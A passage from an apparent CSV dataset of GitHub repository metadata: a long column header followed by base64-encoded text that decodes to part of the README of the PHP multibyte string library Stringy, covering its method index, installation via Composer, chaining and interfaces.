name,id,description,language,open_issues,stargazers_count,topics,watchers,fork,forks_url,readme,config,travis0,travis1,travis2,travis3,travis4,travis5,travis6,travis7,travis8,travis9,travis10,travis11,travis12,travis13,travis14,travis15,travis16,travis17,travis18,travis19,travis20,travis21,travis22,travis23,gitlab0,gitlab1,gitlab2,gitlab3,gitlab4,gitlab5,gitlab6,gitlab7,gitlab8,gitlab9,gitlab10,gitlab11,gitlab12,gitlab13,gitlab14,gitlab15,gitlab16,gitlab17,gitlab18,gitlab19,gitlab20,gitlab21,gitlab22,gitlab23,jenkinsPipeline0,jenkinsPipeline1,jenkinsPipeline2,jenkinsPipeline3,jenkinsPipeline4,jenkinsPipeline5,jenkinsPipeline6,jenkinsPipeline7,jenkinsPipeline8,jenkinsPipeline9,jenkinsPipeline10,jenkinsPipeline11,jenkinsPipeline12,jenkinsPipeline13,jenkinsPipeline14,jenkinsPipeline15,jenkinsPipeline16,jenkinsPipeline17,jenkinsPipeline18,jenkinsPipeline19,jenkinsPipeline20,jenkinsPipeline21,jenkinsPipeline22,jenkinsPipeline23,cirrus0,cirrus1,cirrus2,cirrus3,cirrus4,cirrus5,cirrus6,cirrus7,cirrus8,cirrus9,cirrus10,cirrus11,cirrus12,cirrus13,cirrus14,cirrus15,cirrus16,cirrus17,cirrus18,cirrus19,cirrus20,cirrus21,cirrus22,cirrus23,github0,github1,github2,github3,github4,github5,github6,github7,github8,github9,github10,github11,github12,github13,github14,github15,github16,github17,github18,github19,github20,github21,github22,github23,cds0,cds1,cds2,cds3,cds4,cds5,cds6,cds7,cds8,cds9,cds10,cds11,cds12,cds13,cds14,cds15,cds16,cds17,cds18,cds19,cds20,cds21,cds22,cds23,azure0,azure1,azure2,azure3,azure4,azure5,azure6,azure7,azure8,azure9,azure10,azure11,azure12,azure13,azure14,azure15,azure16,azure17,azure18,azure19,azure20,azure21,azure22,azure23,circleci0,circleci1,circleci2,circleci3,circleci4,circleci5,circleci6,circleci7,circleci8,circleci9,circleci10,circleci11,circleci12,circleci13,circleci14,circleci15,circleci16,circleci17,circleci18,circleci19,circleci20,circleci21,circleci22,circleci23,bitbucket0,bitbucket1,bitbucket2,bitbucket3,bitbucket4,bitbucket5,bitbucket6,bitbucket7,bitbucket8,bitbucket9,bitbucket10,bitbucket11,bitbucket12,bitbucket13,bitbucket14,bitbucket15,bitbucket16,bitbucket17,bitbucket18,bitbucket19,bitbucket20,bitbucket21,bitbucket22,bitbucket23
ZGV4LXN0cmluZy1zdWJzdHJpbmciPmluc2VydDwvYT48L3RkPgogICAgICAg
IDx0ZD48YSBocmVmPSIjaXNhbHBoYSI+aXNBbHBoYTwvYT48L3RkPgogICAg
ICAgIDx0ZD48YSBocmVmPSIjaXNhbHBoYW51bWVyaWMiPmlzQWxwaGFudW1l
cmljPC9hPjwvdGQ+CiAgICA8L3RyPgogICAgPHRyPgogICAgICAgIDx0ZD48
YSBocmVmPSIjaXNiYXNlNjQiPmlzQmFzZTY0PC9hPjwvdGQ+CiAgICAgICAg
PHRkPjxhIGhyZWY9IiNpc2JsYW5rIj5pc0JsYW5rPC9hPjwvdGQ+CiAgICAg
ICAgPHRkPjxhIGhyZWY9IiNpc2hleGFkZWNpbWFsIj5pc0hleGFkZWNpbWFs
PC9hPjwvdGQ+CiAgICAgICAgPHRkPjxhIGhyZWY9IiNpc2pzb24iPmlzSnNv
bjwvYT48L3RkPgogICAgPC90cj4KICAgIDx0cj4KICAgICAgICA8dGQ+PGEg
aHJlZj0iI2lzbG93ZXJjYXNlIj5pc0xvd2VyQ2FzZTwvYT48L3RkPgogICAg
ICAgIDx0ZD48YSBocmVmPSIjaXNzZXJpYWxpemVkIj5pc1NlcmlhbGl6ZWQ8
L2E+PC90ZD4KICAgICAgICA8dGQ+PGEgaHJlZj0iI2lzdXBwZXJjYXNlIj5p
c1VwcGVyQ2FzZTwvYT48L3RkPgogICAgICAgIDx0ZD48YSBocmVmPSIjbGFz
dGludC1uIj5sYXN0PC9hPjwvdGQ+CiAgICA8L3RyPgogICAgPHRyPgogICAg
ICAgIDx0ZD48YSBocmVmPSIjbGVuZ3RoIj5sZW5ndGg8L2E+PC90ZD4KICAg
ICAgICA8dGQ+PGEgaHJlZj0iI2xpbmVzIj5saW5lczwvYT48L3RkPgogICAg
ICAgIDx0ZD48YSBocmVmPSIjbG9uZ2VzdGNvbW1vbnByZWZpeHN0cmluZy1v
dGhlcnN0ciI+bG9uZ2VzdENvbW1vblByZWZpeDwvYT48L3RkPgogICAgICAg
IDx0ZD48YSBocmVmPSIjbG9uZ2VzdGNvbW1vbnN1ZmZpeHN0cmluZy1vdGhl
cnN0ciI+bG9uZ2VzdENvbW1vblN1ZmZpeDwvYT48L3RkPgogICAgPC90cj4K
ICAgIDx0cj4KICAgICAgICA8dGQ+PGEgaHJlZj0iI2xvbmdlc3Rjb21tb25z
dWJzdHJpbmdzdHJpbmctb3RoZXJzdHIiPmxvbmdlc3RDb21tb25TdWJzdHJp
bmc8L2E+PC90ZD4KICAgICAgICA8dGQ+PGEgaHJlZj0iI2xvd2VyY2FzZWZp
cnN0Ij5sb3dlckNhc2VGaXJzdDwvYT48L3RkPgogICAgICAgIDx0ZD48YSBo
cmVmPSIjcGFkaW50LWxlbmd0aC0tc3RyaW5nLXBhZHN0ci0tLS0tc3RyaW5n
LXBhZHR5cGUtLXJpZ2h0LSI+cGFkPC9hPjwvdGQ+CiAgICAgICAgPHRkPjxh
IGhyZWY9IiNwYWRib3RoaW50LWxlbmd0aC0tc3RyaW5nLXBhZHN0ci0tLS0i
PnBhZEJvdGg8L2E+PC90ZD4KICAgIDwvdHI+CiAgICA8dHI+CiAgICAgICAg
PHRkPjxhIGhyZWY9IiNwYWRsZWZ0aW50LWxlbmd0aC0tc3RyaW5nLXBhZHN0
ci0tLS0iPnBhZExlZnQ8L2E+PC90ZD4KICAgICAgICA8dGQ+PGEgaHJlZj0i
I3BhZHJpZ2h0aW50LWxlbmd0aC0tc3RyaW5nLXBhZHN0ci0tLS0iPnBhZFJp
Z2h0PC9hPjwvdGQ+CiAgICAgICAgPHRkPjxhIGhyZWY9IiNwcmVwZW5kc3Ry
aW5nLXN0cmluZyI+cHJlcGVuZDwvYT48L3RkPgogICAgICAgIDx0ZD48YSBo
cmVmPSIjcmVnZXhyZXBsYWNlc3RyaW5nLXBhdHRlcm4tc3RyaW5nLXJlcGxh
Y2VtZW50LS1zdHJpbmctb3B0aW9ucy0tbXNyIj5yZWdleFJlcGxhY2U8L2E+
PC90ZD4KICAgIDwvdHI+CiAgICA8dHI+CiAgICAgICAgPHRkPjxhIGhyZWY9
IiNyZW1vdmVsZWZ0c3RyaW5nLXN1YnN0cmluZyI+cmVtb3ZlTGVmdDwvYT48
L3RkPgogICAgICAgIDx0ZD48YSBocmVmPSIjcmVtb3ZlcmlnaHRzdHJpbmct
c3Vic3RyaW5nIj5yZW1vdmVSaWdodDwvYT48L3RkPgogICAgICAgIDx0ZD48
YSBocmVmPSIjcmVwZWF0aW50LW11bHRpcGxpZXIiPnJlcGVhdDwvYT48L3Rk
PgogICAgICAgIDx0ZD48YSBocmVmPSIjcmVwbGFjZXN0cmluZy1zZWFyY2gt
c3RyaW5nLXJlcGxhY2VtZW50Ij5yZXBsYWNlPC9hPjwvdGQ+CiAgICA8L3Ry
PgogICAgPHRyPgogICAgICAgIDx0ZD48YSBocmVmPSIjcmV2ZXJzZSI+cmV2
ZXJzZTwvYT48L3RkPgogICAgICAgIDx0ZD48YSBocmVmPSIjc2FmZXRydW5j
YXRlaW50LWxlbmd0aC0tc3RyaW5nLXN1YnN0cmluZy0tLSI+c2FmZVRydW5j
YXRlPC9hPjwvdGQ+CiAgICAgICAgPHRkPjxhIGhyZWY9IiNzaHVmZmxlIj5z
aHVmZmxlPC9hPjwvdGQ+CiAgICAgICAgPHRkPjxhIGhyZWY9IiNzbHVnaWZ5
LXN0cmluZy1yZXBsYWNlbWVudC0tLS0tc3RyaW5nLWxhbmd1YWdlLS1lbiI+
c2x1Z2lmeTwvYT48L3RkPgogICAgPC90cj4KICAgIDx0cj4KICAgICAgICA8
dGQ+PGEgaHJlZj0iI3NsaWNlaW50LXN0YXJ0LS1pbnQtZW5kLSI+c2xpY2U8
L2E+PC90ZD4KICAgICAgICA8dGQ+PGEgaHJlZj0iI3NwbGl0c3RyaW5nLXBh
dHRlcm4tLWludC1saW1pdC0iPnNwbGl0PC9hPjwvdGQ+CiAgICAgICAgPHRk
PjxhIGhyZWY9IiNzdGFydHN3aXRoc3RyaW5nLXN1YnN0cmluZy0tYm9vbGVh
bi1jYXNlc2Vuc2l0aXZlLS10cnVlLSI+c3RhcnRzV2l0aDwvYT48L3RkPgog
ICAgICAgIDx0ZD48YSBocmVmPSIjc3RhcnRzd2l0aGFueXN0cmluZy1zdWJz
dHJpbmdzLS1ib29sZWFuLWNhc2VzZW5zaXRpdmUtLXRydWUtIj5zdGFydHNX
aXRoQW55PC9hPjwvdGQ+CiAgICA8L3RyPgogICAgPHRyPgogICAgICAgIDx0
ZD48YSBocmVmPSIjc3RyaXB3aGl0ZXNwYWNlIj5zdHJpcFdoaXRlc3BhY2U8
L2E+PC90ZD4KICAgICAgICA8dGQ+PGEgaHJlZj0iI3N1YnN0cmludC1zdGFy
dC0taW50LWxlbmd0aC0iPnN1YnN0cjwvYT48L3RkPgogICAgICAgIDx0ZD48
YSBocmVmPSIjc3Vycm91bmRzdHJpbmctc3Vic3RyaW5nIj5zdXJyb3VuZDwv
YT48L3RkPgogICAgICAgIDx0ZD48YSBocmVmPSIjc3dhcGNhc2UiPnN3YXBD
YXNlPC9hPjwvdGQ+CiAgICA8L3RyPgogICAgPHRyPgogICAgICAgIDx0ZD48
YSBocmVmPSIjdGlkeSI+dGlkeTwvYT48L3RkPgogICAgICAgIDx0ZD48YSBo
cmVmPSIjdGl0bGVpemUtYXJyYXktaWdub3JlIj50aXRsZWl6ZTwvYT48L3Rk
PgogICAgICAgIDx0ZD48YSBocmVmPSIjdG9hc2NpaS1zdHJpbmctbGFuZ3Vh
Z2UtLWVuLS1ib29sLXJlbW92ZXVuc3VwcG9ydGVkLS10cnVlLSI+dG9Bc2Np
aTwvYT48L3RkPgogICAgICAgIDx0ZD48YSBocmVmPSIjdG9ib29sZWFuIj50
b0Jvb2xlYW48L2E+PC90ZD4KICAgIDwvdHI+CiAgICA8dHI+CiAgICAgICAg
PHRkPjxhIGhyZWY9IiN0b2xvd2VyY2FzZSI+dG9Mb3dlckNhc2U8L2E+PC90
ZD4KICAgICAgICA8dGQ+PGEgaHJlZj0iI3Rvc3BhY2VzLXRhYmxlbmd0aC0t
NC0iPnRvU3BhY2VzPC9hPjwvdGQ+CiAgICAgICAgPHRkPjxhIGhyZWY9IiN0
b3RhYnMtdGFibGVuZ3RoLS00LSI+dG9UYWJzPC9hPjwvdGQ+CiAgICAgICAg
PHRkPjxhIGhyZWY9IiN0b3RpdGxlY2FzZSI+dG9UaXRsZUNhc2U8L2E+PC90
ZD4KICAgIDwvdHI+CiAgICA8dHI+CiAgICAgICAgPHRkPjxhIGhyZWY9IiN0
b3VwcGVyY2FzZSI+dG9VcHBlckNhc2U8L2E+PC90ZD4KICAgICAgICA8dGQ+
PGEgaHJlZj0iI3RyaW0tc3RyaW5nLWNoYXJzIj50cmltPC9hPjwvdGQ+CiAg
ICAgICAgPHRkPjxhIGhyZWY9IiN0cmltbGVmdC1zdHJpbmctY2hhcnMiPnRy
aW1MZWZ0PC9hPjwvdGQ+CiAgICAgICAgPHRkPjxhIGhyZWY9IiN0cmltcmln
aHQtc3RyaW5nLWNoYXJzIj50cmltUmlnaHQ8L2E+PC90ZD4KICAgIDwvdHI+
CiAgICA8dHI+CiAgICAgICAgPHRkPjxhIGhyZWY9IiN0cnVuY2F0ZWludC1s
ZW5ndGgtLXN0cmluZy1zdWJzdHJpbmctLS0iPnRydW5jYXRlPC9hPjwvdGQ+
CiAgICAgICAgPHRkPjxhIGhyZWY9IiN1bmRlcnNjb3JlZCI+dW5kZXJzY29y
ZWQ8L2E+PC90ZD4KICAgICAgICA8dGQ+PGEgaHJlZj0iI3VwcGVyY2FtZWxp
emUiPnVwcGVyQ2FtZWxpemU8L2E+PC90ZD4KICAgICAgICA8dGQ+PGEgaHJl
Zj0iI3VwcGVyY2FzZWZpcnN0Ij51cHBlckNhc2VGaXJzdDwvYT48L3RkPgog
ICAgPC90cj4KPC90YWJsZT4KCiogW0V4dGVuc2lvbnNdKCNleHRlbnNpb25z
KQoqIFtUZXN0c10oI3Rlc3RzKQoqIFtMaWNlbnNlXSgjbGljZW5zZSkKCiMj
IFdoeT8KCkluIHBhcnQgZHVlIHRvIGEgbGFjayBvZiBtdWx0aWJ5dGUgc3Vw
cG9ydCAoaW5jbHVkaW5nIFVURi04KSBhY3Jvc3MgbWFueSBvZgpQSFAncyBz
dGFuZGFyZCBzdHJpbmcgZnVuY3Rpb25zLiBCdXQgYWxzbyB0byBvZmZlciBh
biBPTyB3cmFwcGVyIGFyb3VuZCB0aGUKYG1ic3RyaW5nYCBtb2R1bGUncyBt
dWx0aWJ5dGUtY29tcGF0aWJsZSBmdW5jdGlvbnMuIFN0cmluZ3kgaGFuZGxl
cyBzb21lIHF1aXJrcywKcHJvdmlkZXMgYWRkaXRpb25hbCBmdW5jdGlvbmFs
aXR5LCBhbmQgaG9wZWZ1bGx5IG1ha2VzIHN0cmluZ3MgYSBsaXR0bGUgZWFz
aWVyCnRvIHdvcmsgd2l0aCEKCmBgYHBocAovLyBTdGFuZGFyZCBsaWJyYXJ5
CnN0cnRvdXBwZXIoJ2bDssO0YsOgxZknKTsgICAgICAgLy8gJ0bDssO0QsOg
xZknCnN0cmxlbignZsOyw7Riw6DFmScpOyAgICAgICAgICAgLy8gMTAKCi8v
IG1ic3RyaW5nCm1iX3N0cnRvdXBwZXIoJ2bDssO0YsOgxZknKTsgICAgLy8g
J0bDksOUQsOAxZgnCm1iX3N0cmxlbignZsOyw7Riw6DFmScpOyAgICAgICAg
Ly8gJzYnCgovLyBTdHJpbmd5CnMoJ2bDssO0YsOgxZknKS0+dG9VcHBlckNh
c2UoKTsgLy8gJ0bDksOUQsOAxZgnCnMoJ2bDssO0YsOgxZknKS0+bGVuZ3Ro
KCk7ICAgICAgLy8gJzYnCmBgYAoKIyMgSW5zdGFsbGF0aW9uCgpJZiB5b3Un
cmUgdXNpbmcgQ29tcG9zZXIgdG8gbWFuYWdlIGRlcGVuZGVuY2llcywgeW91
IGNhbiBpbmNsdWRlIHRoZSBmb2xsb3dpbmcKaW4geW91ciBjb21wb3Nlci5q
c29uIGZpbGU6CgpgYGBqc29uCiJyZXF1aXJlIjogewogICAgImRhbmllbHN0
anVsZXMvc3RyaW5neSI6ICJ+My4xLjAiCn0KYGBgCgpUaGVuLCBhZnRlciBy
dW5uaW5nIGBjb21wb3NlciB1cGRhdGVgIG9yIGBwaHAgY29tcG9zZXIucGhh
ciB1cGRhdGVgLCB5b3UgY2FuCmxvYWQgdGhlIGNsYXNzIHVzaW5nIENvbXBv
c2VyJ3MgYXV0b2xvYWRpbmc6CgpgYGBwaHAKcmVxdWlyZSAndmVuZG9yL2F1
dG9sb2FkLnBocCc7CmBgYAoKT3RoZXJ3aXNlLCB5b3UgY2FuIHNpbXBseSBy
ZXF1aXJlIHRoZSBmaWxlIGRpcmVjdGx5OgoKYGBgcGhwCnJlcXVpcmVfb25j
ZSAncGF0aC90by9TdHJpbmd5L3NyYy9TdHJpbmd5LnBocCc7CmBgYAoKQW5k
IGluIGVpdGhlciBjYXNlLCBJJ2Qgc3VnZ2VzdCB1c2luZyBhbiBhbGlhcy4K
CmBgYHBocAp1c2UgU3RyaW5neVxTdHJpbmd5IGFzIFM7CmBgYAoKUGxlYXNl
IG5vdGUgdGhhdCBTdHJpbmd5IHJlbGllcyBvbiB0aGUgYG1ic3RyaW5nYCBt
b2R1bGUgZm9yIGl0cyB1bmRlcmx5aW5nCm11bHRpYnl0ZSBzdXBwb3J0LiBJ
ZiB0aGUgbW9kdWxlIGlzIG5vdCBmb3VuZCwgU3RyaW5neSB3aWxsIHVzZQpb
c3ltZm9ueS9wb2x5ZmlsbC1tYnN0cmluZ10oaHR0cHM6Ly9naXRodWIuY29t
L3N5bWZvbnkvcG9seWZpbGwtbWJzdHJpbmcpLgpleC1tYnN0cmluZyBpcyBh
IG5vbi1kZWZhdWx0LCBidXQgdmVyeSBjb21tb24gbW9kdWxlLiBGb3IgZXhh
bXBsZSwgd2l0aCBkZWJpYW4KYW5kIHVidW50dSwgaXQncyBpbmNsdWRlZCBp
biBsaWJhcGFjaGUyLW1vZC1waHA1LCBwaHA1LWNsaSwgYW5kIHBocDUtZnBt
LiBGb3IKT1NYIHVzZXJzLCBpdCdzIGEgZGVmYXVsdCBmb3IgYW55IHZlcnNp
b24gb2YgUEhQIGluc3RhbGxlZCB3aXRoIGhvbWVicmV3LgpJZiBjb21waWxp
bmcgUEhQIGZyb20gc2NyYXRjaCwgaXQgY2FuIGJlIGluY2x1ZGVkIHdpdGgg
dGhlCmAtLWVuYWJsZS1tYnN0cmluZ2AgZmxhZy4KCiMjIE9PIGFuZCBDaGFp
bmluZwoKVGhlIGxpYnJhcnkgb2ZmZXJzIE9PIG1ldGhvZCBjaGFpbmluZywg
YXMgc2VlbiBiZWxvdzoKCmBgYHBocAp1c2UgU3RyaW5neVxTdHJpbmd5IGFz
IFM7CmVjaG8gUzo6Y3JlYXRlKCdmw7LDtCAgICAgYsOgxZknKS0+Y29sbGFw
c2VXaGl0ZXNwYWNlKCktPnN3YXBDYXNlKCk7IC8vICdGw5LDlCBCw4DFmCcK
YGBgCgpgU3RyaW5neVxTdHJpbmd5YCBoYXMgYSBfX3RvU3RyaW5nKCkgbWV0
aG9kLCB3aGljaCByZXR1cm5zIHRoZSBjdXJyZW50IHN0cmluZwp3aGVuIHRo
ZSBvYmplY3QgaXMgdXNlZCBpbiBhIHN0cmluZyBjb250ZXh0LCBpZToKYChz
dHJpbmcpIFM6OmNyZWF0ZSgnZm9vJykgIC8vICdmb28nYAoKIyMgSW1wbGVt
ZW50ZWQgSW50ZXJmYWNlcwoKYFN0cmluZ3lcU3RyaW5neWAgaW1wbGVtZW50
cyB0aGUgYEl0ZXJhdG9yQWdncmVnYXRlYCBpbnRlcmZhY2UsIG1lYW5pbmcg
dGhhdApgZm9yZWFjaGAgY2FuIGJlIHVzZWQgd2l0aCBhbiBpbnN0YW5jZSBv
ZiB0aGUgY2xhc3M6CgpgYGAgcGhwCiRzdHJpbmd5ID0gUzo6Y3JlYXRlKCdm
w7LDtGLDoMWZJyk7CmZvcmVhY2ggKCRzdHJpbmd5IGFzICRjaGFyKSB7CiAg
ICBlY2hvICRjaGFyOwp9Ci8vICdmw7LDtGLDoMWZJwpgYGAKCkl0IGltcGxl
bWVudHMgdGhlIGBDb3VudGFibGVgIGludGVyZmFjZSwgZW5hYmxpbmcgdGhl
IHVzZSBvZiBgY291bnQoKWAgdG8KcmV0cmlldmUgdGhlIG51bWJlciBvZiBj
aGFyYWN0ZXJzIGluIHRoZSBzdHJpbmc6CgpgYGAgcGhwCiRzdHJpbmd5ID0g
Uzo6Y3JlYXRlKCdmw7LDtCcpOwpjb3VudCgkc3RyaW5neSk7ICAvLyAzCmBg
YAoKRnVydGhlcm1vcmUsIHRoZSBgQXJyYXlBY2Nlc3NgIGludGVyZmFjZSBo
YXMgYmVlbiBpbXBsZW1lbnRlZC4gQXMgYSByZXN1bHQsCmBpc3NldCgpYCBj
YW4gYmUgdXNlZCB0byBjaGVjayBpZiBhIGNoYXJhY3RlciBhdCBhIHNwZWNp
ZmljIGluZGV4IGV4aXN0cy4gQW5kCnNpbmNlIGBTdHJpbmd5XFN0cmluZ3lg
IGlzIGltbXV0YWJsZSwgYW55IGNhbGwgdG8gYG9mZnNldFNldGAgb3IgYG9m
ZnNldFVuc2V0YAp3aWxsIHRocm93IGFuIGV4Y2VwdGlvbi4gYG9mZnNldEdl
dGAgaGFzIGJlZW4gaW1wbGVtZW50ZWQsIGhvd2V2ZXIsIGFuZCBhY2NlcHRz
CmJvdGggcG9zaXRpdmUgYW5kIG5lZ2F0aXZlIGluZGV4ZXMuIEludmFsaWQg
aW5kZXhlcyByZXN1bHQgaW4gYW4KYE91dE9mQm91bmRzRXhjZXB0aW9uYC4K
CmBgYCBwaHAKJHN0cmluZ3kgPSBTOjpjcmVhdGUoJ2LDoMWZJyk7CmVjaG8g
JHN0cmluZ3lbMl07ICAgICAvLyAnxZknCmVjaG8gJHN0cmluZ3lbLTJdOyAg
ICAvLyAnw6AnCmlzc2V0KCRzdHJpbmd5Wy00XSk7ICAvLyBmYWxzZQoKJHN0
cmluZ3lbM107ICAgICAgICAgIC8vIE91dE9mQm91bmRzRXhjZXB0aW9uCiRz
dHJpbmd5WzJdID0gJ2EnOyAgICAvLyBFeGNlcHRpb24KYGBgCgojIyBQSFAg
NS42IENyZWF0aW9uCgpBcyBvZiBQSFAgNS42LCBbYHVzZSBmdW5jdGlvbmBd
KGh0dHBzOi8vd2lraS5waHAubmV0L3JmYy91c2VfZnVuY3Rpb24pIGlzCmF2
YWlsYWJsZSBmb3IgaW1wb3J0aW5nIGZ1bmN0aW9ucy4gU3RyaW5neSBleHBv
c2VzIGEgbmFtZXNwYWNlZCBmdW5jdGlvbiwKYFN0cmluZ3lcY3JlYXRlYCwg
d2hpY2ggZW1pdHMgdGhlIHNhbWUgYmVoYXZpb3VyIGFzIGBTdHJpbmd5XFN0
cmluZ3k6OmNyZWF0ZSgpYC4KSWYgcnVubmluZyBQSFAgNS42LCBvciBhbm90
aGVyIHJ1bnRpbWUgdGhhdCBzdXBwb3J0cyB0aGUgYHVzZSBmdW5jdGlvbmAg
c3ludGF4LAp5b3UgY2FuIHRha2UgYWR2YW50YWdlIG9mIGFuIGV2ZW4gc2lt
cGxlciBBUEkgYXMgc2VlbiBiZWxvdzoKCmBgYCBwaHAKdXNlIGZ1bmN0aW9u
IFN0cmluZ3lcY3JlYXRlIGFzIHM7CgovLyBJbnN0ZWFkIG9mOiBTOjpjcmVh
dGUoJ2bDssO0ICAgICBiw6DFmScpCnMoJ2bDssO0ICAgICBiw6DFmScpLT5j
b2xsYXBzZVdoaXRlc3BhY2UoKS0+c3dhcENhc2UoKTsKYGBgCgojIyBTdGF0
aWNTdHJpbmd5CgpBbGwgbWV0aG9kcyBsaXN0ZWQgdW5kZXIgIkluc3RhbmNl
IG1ldGhvZHMiIGFyZSBhdmFpbGFibGUgYXMgcGFydCBvZiBhIHN0YXRpYwp3
cmFwcGVyLiBGb3IgU3RhdGljU3RyaW5neSBtZXRob2RzLCB0aGUgb3B0aW9u
YWwgZW5jb2RpbmcgaXMgZXhwZWN0ZWQgdG8gYmUgdGhlCmxhc3QgYXJndW1l
bnQuIFRoZSByZXR1cm4gdmFsdWUgaXMgbm90IGNhc3QsIGFuZCBtYXkgdGh1
cyBiZSBvZiB0eXBlIFN0cmluZ3ksCmludGVnZXIsIGJvb2xlYW4sIGV0Yy4K
CmBgYHBocAp1c2UgU3RyaW5neVxTdGF0aWNTdHJpbmd5IGFzIFM7CgovLyBU
cmFuc2xhdGVzIHRvIFN0cmluZ3k6OmNyZWF0ZSgnZsOyw7Riw6DFmScpLT5z
bGljZSgwLCAzKTsKLy8gUmV0dXJucyBhIFN0cmluZ3kgb2JqZWN0IHdpdGgg
dGhlIHN0cmluZyAiZsOyw7QiClM6OnNsaWNlKCdmw7LDtGLDoMWZJywgMCwg
Myk7CmBgYAoKIyMgQ2xhc3MgbWV0aG9kcwoKIyMjIyMgY3JlYXRlKG1peGVk
ICRzdHIgWywgJGVuY29kaW5nIF0pCgpDcmVhdGVzIGEgU3RyaW5neSBvYmpl
Y3QgYW5kIGFzc2lnbnMgYm90aCBzdHIgYW5kIGVuY29kaW5nIHByb3BlcnRp
ZXMKdGhlIHN1cHBsaWVkIHZhbHVlcy4gJHN0ciBpcyBjYXN0IHRvIGEgc3Ry
aW5nIHByaW9yIHRvIGFzc2lnbm1lbnQsIGFuZCBpZgokZW5jb2RpbmcgaXMg
bm90IHNwZWNpZmllZCwgaXQgZGVmYXVsdHMgdG8gbWJfaW50ZXJuYWxfZW5j
b2RpbmcoKS4gSXQKdGhlbiByZXR1cm5zIHRoZSBpbml0aWFsaXplZCBvYmpl
Y3QuIFRocm93cyBhbiBJbnZhbGlkQXJndW1lbnRFeGNlcHRpb24KaWYgdGhl
IGZpcnN0IGFyZ3VtZW50IGlzIGFuIGFycmF5IG9yIG9iamVjdCB3aXRob3V0
IGEgX190b1N0cmluZyBtZXRob2QuCgpgYGBwaHAKJHN0cmluZ3kgPSBTOjpj
cmVhdGUoJ2bDssO0YsOgxZknKTsgLy8gJ2bDssO0YsOgxZknCmBgYAoKIyMg
SW5zdGFuY2UgTWV0aG9kcwoKU3RyaW5neSBvYmplY3RzIGFyZSBpbW11dGFi
bGUuIEFsbCBleGFtcGxlcyBiZWxvdyBtYWtlIHVzZSBvZiBQSFAgNS42CmZ1
bmN0aW9uIGltcG9ydGluZywgYW5kIFBIUCA1LjQgc2hvcnQgYXJyYXkgc3lu
dGF4LiBUaGV5IGFsc28gYXNzdW1lIHRoZQplbmNvZGluZyByZXR1cm5lZCBi
eSBtYl9pbnRlcm5hbF9lbmNvZGluZygpIGlzIFVURi04LiBGb3IgZnVydGhl
ciBkZXRhaWxzLApzZWUgdGhlIGRvY3VtZW50YXRpb24gZm9yIHRoZSBjcmVh
dGUgbWV0aG9kIGFib3ZlLCBhcyB3ZWxsIGFzIHRoZSBub3RlcwpvbiBQSFAg
NS42IGNyZWF0aW9uLgoKIyMjIyMgYXBwZW5kKHN0cmluZyAkc3RyaW5nKQoK
UmV0dXJucyBhIG5ldyBzdHJpbmcgd2l0aCAkc3RyaW5nIGFwcGVuZGVkLgoK
YGBgcGhwCnMoJ2bDssO0JyktPmFwcGVuZCgnYsOgxZknKTsgLy8gJ2bDssO0
YsOgxZknCmBgYAoKIyMjIyMgYXQoaW50ICRpbmRleCkKClJldHVybnMgdGhl
IGNoYXJhY3RlciBhdCAkaW5kZXgsIHdpdGggaW5kZXhlcyBzdGFydGluZyBh
dCAwLgoKYGBgcGhwCnMoJ2bDssO0YsOgxZknKS0+YXQoMyk7IC8vICdiJwpg
YGAKCiMjIyMjIGJldHdlZW4oc3RyaW5nICRzdGFydCwgc3RyaW5nICRlbmQg
WywgaW50ICRvZmZzZXRdKQoKUmV0dXJucyB0aGUgc3Vic3RyaW5nIGJldHdl
ZW4gJHN0YXJ0IGFuZCAkZW5kLCBpZiBmb3VuZCwgb3IgYW4gZW1wdHkKc3Ry
aW5nLiBBbiBvcHRpb25hbCBvZmZzZXQgbWF5IGJlIHN1cHBsaWVkIGZyb20g
d2hpY2ggdG8gYmVnaW4gdGhlCnNlYXJjaCBmb3IgdGhlIHN0YXJ0IHN0cmlu
Zy4KCmBgYHBocApzKCd7Zm9vfSBhbmQge2Jhcn0nKS0+YmV0d2Vlbigneycs
ICd9Jyk7IC8vICdmb28nCmBgYAoKIyMjIyMgY2FtZWxpemUoKQoKUmV0dXJu
cyBhIGNhbWVsQ2FzZSB2ZXJzaW9uIG9mIHRoZSBzdHJpbmcuIFRyaW1zIHN1
cnJvdW5kaW5nIHNwYWNlcywKY2FwaXRhbGl6ZXMgbGV0dGVycyBmb2xsb3dp
bmcgZGlnaXRzLCBzcGFjZXMsIGRhc2hlcyBhbmQgdW5kZXJzY29yZXMsCmFu
ZCByZW1vdmVzIHNwYWNlcywgZGFzaGVzLCBhcyB3ZWxsIGFzIHVuZGVyc2Nv
cmVzLgoKYGBgcGhwCnMoJ0NhbWVsLUNhc2UnKS0+Y2FtZWxpemUoKTsgLy8g
J2NhbWVsQ2FzZScKYGBgCgojIyMjIyBjaGFycygpCgpSZXR1cm5zIGFuIGFy
cmF5IGNvbnNpc3Rpbmcgb2YgdGhlIGNoYXJhY3RlcnMgaW4gdGhlIHN0cmlu
Zy4KCmBgYHBocApzKCdmw7LDtGLDoMWZJyktPmNoYXJzKCk7IC8vIFsnZics
ICfDsicsICfDtCcsICdiJywgJ8OgJywgJ8WZJ10KYGBgCgojIyMjIyBjb2xs
YXBzZVdoaXRlc3BhY2UoKQoKVHJpbXMgdGhlIHN0cmluZyBhbmQgcmVwbGFj
ZXMgY29uc2VjdXRpdmUgd2hpdGVzcGFjZSBjaGFyYWN0ZXJzIHdpdGggYQpz
aW5nbGUgc3BhY2UuIFRoaXMgaW5jbHVkZXMgdGFicyBhbmQgbmV3bGluZSBj
aGFyYWN0ZXJzLCBhcyB3ZWxsIGFzCm11bHRpYnl0ZSB3aGl0ZXNwYWNlIHN1
Y2ggYXMgdGhlIHRoaW4gc3BhY2UgYW5kIGlkZW9ncmFwaGljIHNwYWNlLgoK
YGBgcGhwCnMoJyAgIM6fICAgICDPg8+FzrPOs8+BzrHPhs6tzrHPgiAgJykt
PmNvbGxhcHNlV2hpdGVzcGFjZSgpOyAvLyAnzp8gz4PPhc6zzrPPgc6xz4bO
rc6xz4InCmBgYAoKIyMjIyMgY29udGFpbnMoc3RyaW5nICRuZWVkbGUgWywg
